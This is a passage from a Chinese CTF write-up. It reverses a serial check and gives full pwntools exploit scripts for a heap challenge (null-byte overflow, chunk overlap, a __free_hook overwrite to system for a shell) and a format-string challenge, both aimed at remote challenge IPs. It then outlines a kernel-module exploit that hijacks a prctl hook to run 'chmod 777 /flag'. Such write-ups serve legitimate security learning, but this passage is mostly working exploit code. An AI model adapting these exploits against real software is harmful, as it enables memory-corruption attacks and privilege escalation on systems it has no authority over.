用python反着解开
    buf = '!'
    final_buf = "Qf(>qwd!"
    for _ in range(7):
        cur = ord(buf[0])
        i = 6 - _
        for pre in range(256):
            if ord(final_buf[i]) == ((pre | cur) & ~(pre & cur) | i) & ~((pre | cur) & ~(pre & cur) & i):
                buf = chr(pre) + buf
                continue
    print buf
    # e4SyD1C!
exp如下，具体的堆排列情况，我都是实时调的，大家可以参考一下我的文章[interactive-pwnning-tutorial](https://github.com/matrix1001/interactive-pwnning-tutorial)。
    #https://github.com/matrix1001/welpwn
    from PwnContext import *
    if __name__ == '__main__':        
        context.terminal = ['tmux', 'splitw', '-h']
        #context.log_level = 'debug'
        # functions for quick script
        s       = lambda data               :ctx.send(str(data))        #in case that data is an int
        sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
        sl      = lambda data               :ctx.sendline(str(data)) 
        sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
        r       = lambda numb=4096          :ctx.recv(numb)
        ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
        irt     = lambda                    :ctx.interactive()
        rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
        dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
        # misc functions
        uu32    = lambda data   :u32(data.ljust(4, ''))
        uu64    = lambda data   :u64(data.ljust(8, ''))
        ctx.binary = './pwn'
        ctx.remote = ('47.111.59.243', 10001)
        #ctx.custom_lib_dir = './glibc-all-in-one/libs/2.23-0ubuntu10_i386/'
        ctx.remote_libc = './libc6-i386_2.23-0ubuntu10_amd64.so'
        ctx.debug_remote_libc = True
        def perchase(name_len, name, price):
            sla('>>>', 1)
            sla('length', name_len)
            sa('Name', name)
            sla('Price', price)
        def comment(idx, comment, score):
            sla('>>>', 2)
            sla('Index', idx)
            sa('Comment', comment)
            sla('score', score)
        def throw(idx):
            sla('>>>', 3)
            sla('index', idx)
        def rename(idx, new_name, some_fuck):
            sla('>>>', 4)
            sla('index', idx)
            sleep(0.1)
            s(new_name)
            sa('power', 'yn')
            sla('serial', 'e4SyD1C!')
            sa('Pwner', some_fuck)
        ctx.breakpoints = [0x12f2, 0x1328, 0x118f]
        rs('remote')
        # rs()
        libc = ELF('./libc6-i386_2.23-0ubuntu10_amd64.so')
        # dbg('c')
        perchase(0x10, 'testn', 0) #0
        comment(0, 'testcommentn', 0)
        perchase(0x10, 'testn', 0) #1
        throw(0)
        perchase(0x10, 'testn', 0) #0
        comment(0, 'a', 0)
        throw(0)
        ru('Comment ')
        libc_leak = uu32(r(4)) & 0xffffff00
        success('libc_leak = {:#x}'.format(libc_leak))
        libc_base = libc_leak - 0x1b0700
        # clean up
        throw(1)
        #
        perchase(0x8c, 'an', 0) #0
        perchase(0x80, 'an', 0) #1
        perchase(0x40, 'an', 0) #2
        perchase(0xf8, 'an', 0) #3
        perchase(0x20, 'topn', 0) #4
        throw(2)
        # null overflow
        perchase(0x44, 'a'*0x40 + p32(0x190) + 'n', 0) #2
        throw(0)
        # overlap
        throw(3)
        perchase(0x10, 'an', 0) #0
        perchase(0x50, 'an', 0)
        perchase(0x100, p32(0) + p32(0x31) + p32(0) + p32(0x239) + ''*0x14 + 'n', 0) 
        throw(0)
        perchase(0x100, '/bin/shn', 0)
        libc.address = libc_base
        free_hook = libc.sym['__free_hook']
        system = libc.sym['system']
        rename(1, p32(0)*5 + p32(free_hook), p32(system))
        irt()
###  playfmt
是一个很简单的格式串，但是buf放在了bss，需要栈指针链，由于flag已经在内存里面了，泄露一下堆地址，再把flag地址写到栈里面，就可以利用格式化字符串漏洞拿flag了。
    #https://github.com/matrix1001/welpwn
    from PwnContext import *
    try:
        from IPython import embed as ipy
    except ImportError:
        print ('IPython not installed.')
    if __name__ == '__main__':        
        context.terminal = ['tmux', 'splitw', '-h']
        context.log_level = 'debug'
        # functions for quick script
        s       = lambda data               :ctx.send(str(data))        #in case that data is an int
        sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
        sl      = lambda data               :ctx.sendline(str(data)) 
        sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
        r       = lambda numb=4096          :ctx.recv(numb)
        ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
        irt     = lambda                    :ctx.interactive()
        rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
        dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
        # misc functions
        uu32    = lambda data   :u32(data.ljust(4, ''))
        uu64    = lambda data   :u64(data.ljust(8, ''))
        ctx.binary = './playfmt'
        ctx.custom_lib_dir = '/root/share/project/glibc-all-in-one/libs/2.23-0ubuntu11_i386/'
        ctx.debug_remote_libc = True
        ctx.remote = ('120.78.192.35', 9999)
        def fmt(payload):
            sleep(0.2)
            s(payload)
        rs('remote')
        sleep(1)
        ctx.clean()
        fmt('%18$x')
        heap_leak = int(r(), 16)
        flag_addr = heap_leak - 0x18
        flag_addr_c = p32(flag_addr)
        for i in range(4):
            fmt('%{}c%6$hhn'.format(i+0xf0))
            fmt('%{}c%14$hhn'.format(ord(flag_addr_c[i])))
        fmt('%240c%6$hhn')        
        dbg('b *0x0804889Fnc')
        sleep(1)
        ctx.clean()
        fmt('%6$x')
        stack = int(ru(8), 16)
        addup = (0xf0 - (stack & 0xff))/4
        fmt('%240c%6$hhn%{}$s'.format(addup+14))
        r()
###  sudrv
[参考文章](https://bbs.pediy.com/thread-225488.htm)
具体思路和参考文章是一样的。
此次利用分两段完成，首先编写一个简单的leak用来泄露kernel
base，然后再利用模块中的堆溢出漏洞达到任意地址写的目的，劫持prctl的hook，来调用poweroff_work_func来执行’/bin/chmod
777 /flag’
leak.c
    //leak.c